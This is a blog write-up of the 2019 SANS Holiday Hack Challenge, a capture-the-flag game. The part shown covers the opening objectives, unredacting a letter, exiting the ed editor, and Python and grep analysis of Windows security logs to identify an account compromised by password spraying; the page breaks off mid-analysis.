<!DOCTYPE html>
<html lang="en">
<head>
  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/style.min.css">
  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/pygments.min.css">
  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/font-awesome.min.css">
  <link href="https://allyourbase.utouch.fr//extras/style.css" rel="stylesheet">
  <link href="https://allyourbase.utouch.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="All Your Base Are Belong To Me Atom">
  <link rel="shortcut icon" href="/extras/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/extras/favicon.ico" type="image/x-icon">

  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="" />
<meta name="author" content="useless" />
<meta name="description" content="On the twelfth day of Christmas, my true love gave to me: Twelve Phishers phishing Eleven Shells a-popping Ten Passwords spraying Nine Splunks a-splunking Eight Machines learning Seven Metasploit scanning Six Blue Teamers crying Five Golden Tickets Four Domain Hashes Three Malicious Macros Two LAN Turtles and a Pwnage in …" />
<meta name="keywords" content="">
<meta property="og:site_name" content="All Your Base Are Belong To Me"/>
<meta property="og:title" content="SANS Christmas Challenge 2019"/>
<meta property="og:description" content="On the twelfth day of Christmas, my true love gave to me: Twelve Phishers phishing Eleven Shells a-popping Ten Passwords spraying Nine Splunks a-splunking Eight Machines learning Seven Metasploit scanning Six Blue Teamers crying Five Golden Tickets Four Domain Hashes Three Malicious Macros Two LAN Turtles and a Pwnage in …"/>
<meta property="og:locale" content="en_US"/>
<meta property="og:url" content="https://allyourbase.utouch.fr/posts/2020/01/14/sans-christmas-challenge-2019/"/>
<meta property="og:type" content="article"/>
<meta property="article:published_time" content="2020-01-14 00:00:00+01:00"/>
<meta property="article:modified_time" content=""/>
<meta property="article:author" content="https://allyourbase.utouch.fr/author/useless.html">
<meta property="article:section" content="Write-up"/>
<meta property="og:image" content="/images/useless_profile_pic.jpg">  <title>All Your Base Are Belong To Me &ndash; SANS Christmas Challenge 2019</title>
</head>
<body>
  <aside>
    <div>
      <a href="https://allyourbase.utouch.fr">
        <img src="/images/useless_profile_pic.jpg" alt="All Your Base Are Belong To Me" title="All Your Base Are Belong To Me">
      </a>
      <h1><a href="https://allyourbase.utouch.fr">All Your Base Are Belong To Me</a></h1>
      <p>You know, if that's alright with you</p>
      <nav>
        <ul class="list">
        </ul>
      </nav>
      <ul class="social">
        <li><a class="sc-envelope-o" href="mailto:yannick at meheut dot org" target="_blank"><i class="fa fa-envelope-o"></i></a></li>
        <li><a class="sc-github" href="https://github.com/the-useless-one/" target="_blank"><i class="fa fa-github"></i></a></li>
        <li><a class="sc-rss" href="https://allyourbase.utouch.fr/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
      </ul>
    </div>
  </aside>
  <main>
    <nav>
      <a href="https://allyourbase.utouch.fr">Home</a>
      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="https://allyourbase.utouch.fr/feeds/all.atom.xml">Atom</a>
    </nav>

<article>
  <header>
    <h1 id="sans-christmas-challenge-2019">SANS Christmas Challenge 2019</h1>
    <p>Posted on mar. 14 janvier 2020 in <a href="https://allyourbase.utouch.fr/category/write-up.html">Write-up</a></p>
  </header>
  <div>
    <img alt="sans_christmas_challenge_2019_logo.png" class="align-center" src="/images/sans-christmas-challenge-2019/sans_christmas_challenge_2019_logo.png" />
<p>On the twelfth day of Christmas, my true love gave to me:</p>
<p>Twelve Phishers phishing</p>
<p>Eleven Shells a-popping</p>
<p>Ten Passwords spraying</p>
<p>Nine Splunks a-splunking</p>
<p>Eight Machines learning</p>
<p>Seven Metasploit scanning</p>
<p>Six Blue Teamers crying</p>
<p>Five Golden Tickets</p>
<p>Four Domain Hashes</p>
<p>Three Malicious Macros</p>
<p>Two LAN Turtles</p>
<p>and a Pwnage in a Pear Tree</p>
<p>Here's my write-up for the <a class="reference external" href="https://holidayhackchallenge.com/2019/">2019 SANS Christmas Challenge</a>.</p>
<div class="contents topic" id="table-of-contents">
<p class="topic-title first">Table of contents</p>
<ul class="simple">
<li><a class="reference internal" href="#introduction" id="id1">Introduction</a></li>
<li><a class="reference internal" href="#objective-0-talk-to-santa-in-the-quad" id="id2">Objective 0: Talk to Santa in the Quad</a></li>
<li><a class="reference internal" href="#objective-1-find-the-turtle-doves" id="id3">Objective 1: Find the Turtle Doves</a></li>
<li><a class="reference internal" href="#objective-2-unredact-threatening-document" id="id4">Objective 2: Unredact Threatening Document</a></li>
<li><a class="reference internal" href="#objective-3" id="id5">Objective 3:</a><ul>
<li><a class="reference internal" href="#bushy-evergreen-s-cranberry-pi-challenge" id="id6">Bushy Evergreen's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#windows-log-analysis-evaluate-attack-outcome" id="id7">Windows Log Analysis: Evaluate Attack Outcome</a></li>
</ul>
</li>
<li><a class="reference internal" href="#objective-4" id="id8">Objective 4:</a><ul>
<li><a class="reference internal" href="#sugarplum-mary-s-cranberry-pi-challenge" id="id9">SugarPlum Mary's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#windows-log-analysis-determine-attacker-technique" id="id10">Windows Log Analysis: Determine Attacker Technique</a></li>
</ul>
</li>
<li><a class="reference internal" href="#objective-5" id="id11">Objective 5:</a><ul>
<li><a class="reference internal" href="#sparkle-redberry-s-canberry-pi-challenge" id="id12">Sparkle Redberry's Canberry Pi Challenge</a></li>
<li><a class="reference internal" href="#network-log-analysis-determine-compromised-system" id="id13">Network Log Analysis: Determine Compromised System</a></li>
</ul>
</li>
<li><a class="reference internal" href="#objective-6-splunk" id="id14">Objective 6: Splunk</a><ul>
<li><a class="reference internal" href="#answering-the-challenge-question" id="id15">Answering the challenge question</a></li>
<li><a class="reference internal" href="#answering-the-training-questions" id="id16">Answering the training questions</a><ul>
<li><a class="reference internal" href="#first-question" id="id17">First question</a></li>
<li><a class="reference internal" href="#second-question" id="id18">Second question</a></li>
<li><a class="reference internal" href="#third-question" id="id19">Third question</a></li>
<li><a class="reference internal" href="#fourth-question" id="id20">Fourth question</a></li>
<li><a class="reference internal" href="#fifth-question" id="id21">Fifth question</a></li>
<li><a class="reference internal" href="#sixth-question" id="id22">Sixth question</a></li>
<li><a class="reference internal" href="#seventh-question" id="id23">Seventh question</a></li>
</ul>
</li>
</ul>
</li>
<li><a class="reference internal" href="#objective-7" id="id24">Objective 7:</a><ul>
<li><a class="reference internal" href="#the-dorm-room-s-keypad" id="id25">The Dorm Room's Keypad</a></li>
<li><a class="reference internal" href="#minty-candy-cane-s-cranberry-pi-challenge" id="id26">Minty Candy Cane's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#get-access-to-the-steam-tunnels" id="id27">Get Access To The Steam Tunnels</a></li>
</ul>
</li>
<li><a class="reference internal" href="#objective-8" id="id28">Objective 8:</a><ul>
<li><a class="reference internal" href="#alabaster-snowball-s-cranberry-pi-challenge" id="id29">Alabaster Snowball's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#bypassing-the-frido-sleigh-capteha" id="id30">Bypassing the Frido Sleigh CAPTEHA</a></li>
</ul>
</li>
<li><a class="reference internal" href="#objective-9" id="id31">Objective 9:</a><ul>
<li><a class="reference internal" href="#pepper-minstix-s-cranberry-pi-challenge" id="id32">Pepper Minstix's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#retrieve-scraps-of-paper-from-server" id="id33">Retrieve Scraps of Paper from Server</a></li>
</ul>
</li>
<li><a class="reference internal" href="#objective-10" id="id34">Objective 10:</a><ul>
<li><a class="reference internal" href="#holly-evergreen-s-cranberry-pi-challenge" id="id35">Holly Evergreen's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#recover-cleartext-document" id="id36">Recover Cleartext Document</a></li>
</ul>
</li>
<li><a class="reference internal" href="#objective-11" id="id37">Objective 11:</a><ul>
<li><a class="reference internal" href="#kent-tinseltooth-s-cranberry-pi-challenge" id="id38">Kent Tinseltooth's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#open-the-sleigh-shop-door" id="id39">Open the Sleigh Shop Door</a></li>
</ul>
</li>
<li><a class="reference internal" href="#objective-12" id="id40">Objective 12:</a><ul>
<li><a class="reference internal" href="#wunorse-openslae-s-cranberry-pi-challenge" id="id41">Wunorse Openslae's Cranberry Pi Challenge</a></li>
<li><a class="reference internal" href="#filter-out-poisoned-sources-of-weather-data" id="id42">Filter Out Poisoned Sources of Weather Data</a></li>
</ul>
</li>
<li><a class="reference internal" href="#conclusion" id="id43">Conclusion</a></li>
<li><a class="reference internal" href="#answer-to-the-questions" id="id44">Answer to the questions</a></li>
</ul>
</div>
<div class="section" id="introduction">
<h2><a class="toc-backref" href="#id1">Introduction</a></h2>
<p>Santa is organizing a new KringleCon, with new speakers and all that! It's
taking place at Elf University.</p>
<img alt="santa.png" class="align-center" src="/images/sans-christmas-challenge-2019/santa.png" />
<p><em>Santa says</em></p>
<blockquote>
<p>Welcome to the North Pole and KringleCon 2!</p>
<p>Last year, KringleCon hosted over 17,500 attendees and my castle got a
little crowded.</p>
<p>We moved the event to Elf University (Elf U for short), the North Pole’s
largest venue.</p>
<p>Please feel free to explore, watch talks, and enjoy the con!</p>
</blockquote>
<p>Here are the questions we must answer:</p>
<ol class="arabic">
<li><p class="first">Someone sent a threatening letter to Elf University. What is the first word
in ALL CAPS in the subject line of the letter? Please find the letter in the
Quad.</p>
</li>
<li><p class="first">We're seeing attacks against the Elf U domain! Using the <a class="reference external" href="/docs/sans-christmas-challenge-2019/Security.evtx.zip">event log data</a>,
identify the user account that the attacker compromised using a password
spray attack.</p>
</li>
<li><p class="first">Using <a class="reference external" href="/docs/sans-christmas-challenge-2019/sysmon-data.json.zip">these normalized Sysmon logs</a>,
identify the tool the attacker used to retrieve domain password hashes from
the lsass.exe process.</p>
</li>
<li><p class="first">The attacks don't stop! Can you help identify the IP address of the
malware-infected system using these <a class="reference external" href="https://downloads.elfu.org/elfu-zeeklogs.zip">Zeek logs</a>?</p>
</li>
<li><p class="first">Access <a class="reference external" href="https://splunk.elfu.org/">https://splunk.elfu.org/</a> as <code>elf</code> with password
<code>elfsocks</code>. What was the message for Kent that the adversary embedded
in this attack? The SOC folks at that link will help you along!</p>
</li>
<li><p class="first">Gain access to the steam tunnels. Who took the turtle doves? Please tell us
their first and last name.</p>
</li>
<li><p class="first">Help Krampus beat the <a class="reference external" href="https://fridosleigh.com/">Frido Sleigh contest</a>.</p>
</li>
<li><p class="first">Gain access to the data on the <a class="reference external" href="https://studentportal.elfu.org/">Student Portal</a>
server and retrieve the paper scraps hosted there. What is the name of
Santa's cutting-edge sleigh guidance system?</p>
</li>
<li><p class="first">The Elfscrow Crypto tool is a vital asset used at Elf University for
encrypting SUPER SECRET documents. We can't send you the source, but we do
have debug symbols that you can use.</p>
<p>Recover the plaintext content for this encrypted document. We know that it
was encrypted on December 6, 2019, between 7pm and 9pm UTC.</p>
<p>What is the middle line on the cover page? (Hint: it's five words)</p>
</li>
<li><p class="first">Visit Shinny Upatree in the Student Union and help solve their problem.
What is written on the paper you retrieve for Shinny?</p>
</li>
<li><p class="first">Use the data supplied in the Zeek JSON logs to identify the IP addresses of
attackers poisoning Santa's flight mapping software. <a class="reference external" href="https://srf.elfu.org/">Block the 100
offending sources of information to guide Santa's sleigh</a>
through the attack. Submit the Route ID (&quot;RID&quot;) success value that you're
given.</p>
</li>
</ol>
<p>Now, this year I did use some hints, because there were some questions that
were outside my domain of expertise. So I thought I wouldn't restrict myself,
so that I could get to the end of the challenge. Anyway, let's get to it!</p>
</div>
<div class="section" id="objective-0-talk-to-santa-in-the-quad">
<h2><a class="toc-backref" href="#id2">Objective 0: Talk to Santa in the Quad</a></h2>
<p>The first objective is to talk to Santa in the Quad.</p>
<img alt="santa_squad.png" class="align-center" src="/images/sans-christmas-challenge-2019/santa_squad.png" />
<p><em>Santa says</em></p>
<blockquote>
<p>This is a little embarrassing, but I need your help.</p>
<p>Our KringleCon turtle dove mascots are missing!</p>
<p>They probably just wandered off.</p>
<p>Can you please help find them?</p>
<p>To help you search for them and get acquainted with KringleCon, I’ve
created some objectives for you. You can see them in your badge.</p>
<p>Where's your badge? Oh! It's that big, circle emblem on your chest - give
it a tap!</p>
<p>We made them in two flavors - one for our new guests, and one for those
who've attended both KringleCons.</p>
<p>After you find the Turtle Doves and complete objectives 2-5, please come
back and let me know.</p>
<p>Not sure where to start? Try hopping around campus and talking to some
elves.</p>
<p>If you help my elves with some quicker problems, they'll probably remember
clues for the objectives.</p>
</blockquote>
<p>Alright, so the KringleCon's mascots are missing and we must find them. There
are also some more objectives we must fulfill before coming back to Santa.
Let's look for the missing turtle doves!</p>
</div>
<div class="section" id="objective-1-find-the-turtle-doves">
<h2><a class="toc-backref" href="#id3">Objective 1: Find the Turtle Doves</a></h2>
<p>The two turtle doves are simply in the student union building, next to the
chimney.</p>
<img alt="turtledoves.png" class="align-center" src="/images/sans-christmas-challenge-2019/turtledoves.png" />
<p><em>Michael and Jane, the turtle doves, say</em></p>
<blockquote>
Hoot Hooot?</blockquote>
<p>Let's go back to the squad to tell Santa.</p>
</div>
<div class="section" id="objective-2-unredact-threatening-document">
<h2><a class="toc-backref" href="#id4">Objective 2: Unredact Threatening Document</a></h2>
<p>In a corner of the squad, we find <a class="reference external" href="/docs/sans-christmas-challenge-2019/LetterToElfUPersonnel.pdf">a letter</a>
addressed to the personnel of Elf U, with some redacted content.</p>
<p>However, we can easily recover the redacted content by selecting the text, and
copying/pasting it into a text editor.</p>
<img alt="redacted_letter.png" class="align-center" src="/images/sans-christmas-challenge-2019/redacted_letter.png" />
<p><em>Redacted letter says</em></p>
<blockquote>
<p>Date: February 28, 2019</p>
<p>To the Administration, Faculty, and Staff of Elf University
17 Christmas Tree Lane
North Pole</p>
<p>From: A Concerned and Aggrieved Character</p>
<p>Subject: DEMAND: Spread Holiday Cheer Confidential
to Other Holidays and Mythical Characters... OR
ELSE!</p>
<p>Attention All Elf University Personnel,</p>
<p>It remains a constant source of frustration that Elf University and the
entire operation at the North Pole focuses exclusively on Mr. S. Claus and
his year-end holiday spree. We URGE you to consider lending your
considerable resources and expertise in providing merriment, cheer, toys,
candy, and much more to other holidays year-round, as well as to other
mythical Confidential characters.</p>
<p>For centuries, we have expressed our frustration at your lack of
willingness to spread your cheer beyond the inaptly-called “Holiday
Season.” There are many other perfectly fine holidays and mythical
characters that need your direct support year-round.</p>
<p>If you do not accede to our demands, we will be forced to take matters into
our own hands.  We do not make this threat lightly. You have less than six
months to act demonstrably.</p>
<p>Sincerely,</p>
<p class="attribution">&mdash;A Concerned and Aggrieved Character</p>
</blockquote>
</div>
<div class="section" id="objective-3">
<h2><a class="toc-backref" href="#id5">Objective 3:</a></h2>
<div class="section" id="bushy-evergreen-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id6">Bushy Evergreen's Cranberry Pi Challenge</a></h3>
<p>Bushy is still having problem exiting his editor. But this one is an old one.</p>
<pre class="literal-block">
                  ........................................
               .;oooooooooooool;,,,,,,,,:loooooooooooooll:
             .:oooooooooooooc;,,,,,,,,:ooooooooooooollooo:
           .';;;;;;;;;;;;;;,''''''''';;;;;;;;;;;;;,;ooooo:
         .''''''''''''''''''''''''''''''''''''''''';ooooo:
       ;oooooooooooool;''''''',:loooooooooooolc;',,;ooooo:
    .:oooooooooooooc;',,,,,,,:ooooooooooooolccoc,,,;ooooo:
  .cooooooooooooo:,''''''',:ooooooooooooolcloooc,,,;ooooo,
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;ooo,
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;l'
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,..
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc.
  coooooooooooooo,,,,,,,,,;ooooooooooooooloooo:.
  coooooooooooooo,,,,,,,,,;ooooooooooooooloo;
  :llllllllllllll,'''''''';llllllllllllllc,
Oh, many UNIX tools grow old, but this one's showing gray.
That Pepper LOLs and rolls her eyes, sends mocking looks my way.
I need to exit, run - get out! - and celebrate the yule.
Your challenge is to help this elf escape this blasted tool.
-Bushy Evergreen
Exit ed.
1100
</pre>
<p>So, we need to exit <code>ed</code>. I don't know this editor, so I had to search
how to exit it. <a class="reference external" href="https://www.computerhope.com/unix/ued.htm">Apparently</a>,
just inputing <code>q</code> is enough:</p>
<pre class="literal-block">
1100
q
Loading, please wait......
You did it! Congratulations!
elf&#64;6f68f4ebb298:~$
</pre>
</div>
<div class="section" id="windows-log-analysis-evaluate-attack-outcome">
<h3><a class="toc-backref" href="#id7">Windows Log Analysis: Evaluate Attack Outcome</a></h3>
<p>Apparently, the person who wrote the threat letter is serious, because we have
reports saying that there are ongoing attacks against the Elf U domain. We're
given the <a class="reference external" href="/docs/sans-christmas-challenge-2019/Security.evtx.zip">event logs</a>,
and tasked to find the account that was compromised using the password spray
attack.</p>
<p>In order to have a format that is more easy to parse, we can use <a class="reference external" href="https://github.com/williballenthin/python-evtx/">python-evtx</a> to convert the
<code>.evtx</code> to an XML file. There is an <a class="reference external" href="https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py">evtx_dump.py</a>
script to do so:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> evtx_dump.py Security.evtx &gt; Security_evtx.xml
</pre></div>
<p>Let's take a look at the <code>EventIDs</code> in this file:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> grep EventID Security_evtx.xml <span class="p">|</span> sort <span class="p">|</span> uniq -c <span class="p">|</span> sort -n
<span class="go">      1             &lt;EventID Qualifiers=&quot;&quot;&gt;1102&lt;/EventID&gt;</span>
<span class="go">      1             &lt;EventID Qualifiers=&quot;&quot;&gt;4616&lt;/EventID&gt;</span>
<span class="go">      2             &lt;EventID Qualifiers=&quot;&quot;&gt;4768&lt;/EventID&gt;</span>
<span class="go">      4             &lt;EventID Qualifiers=&quot;&quot;&gt;4776&lt;/EventID&gt;</span>
<span class="go">      5             &lt;EventID Qualifiers=&quot;&quot;&gt;4769&lt;/EventID&gt;</span>
<span class="go">     15             &lt;EventID Qualifiers=&quot;&quot;&gt;4634&lt;/EventID&gt;</span>
<span class="hll"><span class="go">     16             &lt;EventID Qualifiers=&quot;&quot;&gt;4624&lt;/EventID&gt;</span>
</span><span class="go">     16             &lt;EventID Qualifiers=&quot;&quot;&gt;4672&lt;/EventID&gt;</span>
<span class="go">   2386             &lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;/EventID&gt;</span>
<span class="go">   2387             &lt;EventID Qualifiers=&quot;&quot;&gt;4648&lt;/EventID&gt;</span>
</pre></div>
<p>The most interesting is 4624, because it's the one that says that <a class="reference external" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624">an account
was successfully logged on</a>.</p>
<p>Let's create a small Python script to list every accounts with an
<code>EventID</code> of 4624:</p>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;usage: {} &lt;security_evtx.xml&gt;&#39;</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">security_evtx</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(),</span> <span class="s1">&#39;lxml&#39;</span><span class="p">)</span>

    <span class="n">users_success_login_attempt</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>

    <span class="k">for</span> <span class="n">evt</span> <span class="ow">in</span> <span class="n">security_evtx</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;event&#39;</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">evt</span><span class="o">.</span><span class="n">system</span><span class="o">.</span><span class="n">eventid</span><span class="o">.</span><span class="n">contents</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;4624&#39;</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">users_success_login_attempt</span><span class="o">.</span><span class="n">add</span><span class="p">(</span>
                        <span class="n">evt</span><span class="o">.</span><span class="n">eventdata</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;TargetUserName&#39;</span><span class="p">})[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">string</span><span class="p">)</span>
            <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
                <span class="k">pass</span>

    <span class="k">print</span><span class="p">(</span><span class="n">users_success_login_attempt</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="gp">$</span> ./parse_evtx_xml.py Security_evtx.xml
<span class="go">{&#39;supatree&#39;, &#39;DC1$&#39;, &#39;pminstix&#39;}</span>
</pre></div>
<p>Only three accounts have this code: <code>supatree</code>, <code>pminstix</code>, and
<code>DC1$</code>. This last one seems to be the domain controller, we can likely
ignore it. So it's between <code>supatree</code> and <code>pminstix</code>.</p>
<p>Now, how can we determined which one was compromised? There is another
<code>EventID</code> that is interesting: the 4625. This ID indicates that <a class="reference external" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625">an
account failed to log on</a>.
During a password spray attack, if an account is compromised, an authentication
attempt succeeded. So the compromised account should have one less event with
ID 4625. Let's do some <code>grep</code> magic to find the corresponding account:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> grep -wE <span class="s1">&#39;4625|TargetUserName&#39;</span> Security_evtx.xml <span class="p">|</span> grep -A <span class="m">1</span> <span class="s1">&#39;4625&#39;</span> <span class="p">|</span> grep TargetUserName <span class="p">|</span> sort <span class="p">|</span> uniq -c <span class="p">|</span> sort -nr
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;ygreenpie&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;ygoldentrifle&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;wopenslae&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;twinterfig&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;ttinselbubbles&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;tcandybaubles&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;sscarletpie&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;smullingfluff&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;smary&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;sgreenbells&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;pbrandyberry&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;mstripysleigh&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;mbrandybells&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;ltrufflefig&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;lstripyleaves&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;hevergreen&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;hcandysnaps&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;gchocolatewine&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;gcandyfluff&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;ftwinklestockings&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;ftinseltoes&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;esparklesleigh&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;dsparkleleaves&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;cstripyfluff&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;cjinglebuns&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;civysparkles&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;civypears&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;bevergreen&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;bbrandyleaves&lt;/Data&gt;</span>
<span class="go">     77 &lt;Data Name=&quot;TargetUserName&quot;&gt;Administrator&lt;/Data&gt;</span>
<span class="hll"><span class="go">     76 &lt;Data Name=&quot;TargetUserName&quot;&gt;supatree&lt;/Data&gt;</span>
</span></pre></div>
<p>Let's decompose this command. The first part is:</p>
<pre class="literal-block">
grep -wE '4625|TargetUserName' Security_evtx.xml
</pre>
<p>It will select every line containing the string 4625 or
<code>TargetUserName</code>.</p>
<p>On to the second part:</p>
<pre class="literal-block">
| grep -A 1 '4625'
</pre>
<p>It will select in the previous output every line containing 4625
and the line after it. This will give us an output of every event ID 4625 and
every associated username. Here's the output:</p>
<pre class="literal-block">
&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;/EventID&gt;
&lt;Data Name=&quot;TargetUserName&quot;&gt;Administrator&lt;/Data&gt;
--
&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;/EventID&gt;
&lt;Data Name=&quot;TargetUserName&quot;&gt;bbrandyleaves&lt;/Data&gt;
--
&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;/EventID&gt;
&lt;Data Name=&quot;TargetUserName&quot;&gt;bevergreen&lt;/Data&gt;
--
&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;/EventID&gt;
&lt;Data Name=&quot;TargetUserName&quot;&gt;civypears&lt;/Data&gt;
--
&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;/EventID&gt;
&lt;Data Name=&quot;TargetUserName&quot;&gt;civysparkles&lt;/Data&gt;
--
&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;/EventID&gt;
&lt;Data Name=&quot;TargetUserName&quot;&gt;cjinglebuns&lt;/Data&gt;
--
&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;/EventID&gt;
&lt;Data Name=&quot;TargetUserName&quot;&gt;cstripyfluff&lt;/Data&gt;
</pre>
<p>For the third part:</p>
<pre class="literal-block">
| grep TargetUserName
</pre>
<p>It will select every username in the previous output. We now have the list of
every username with a failed authentication attempt.</p>
<p>Finally the last part:</p>
<pre class="literal-block">
| sort | uniq -c | sort -nr
</pre>
<p>It will sort every entry, count every occurrence, and sort it by number of
occurrences. This gives us the final output:</p>
<pre class="literal-block">
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;ygreenpie&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;ygoldentrifle&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;wopenslae&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;twinterfig&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;ttinselbubbles&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;tcandybaubles&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;sscarletpie&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;smullingfluff&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;smary&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;sgreenbells&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;pbrandyberry&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;mstripysleigh&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;mbrandybells&lt;/Data&gt;
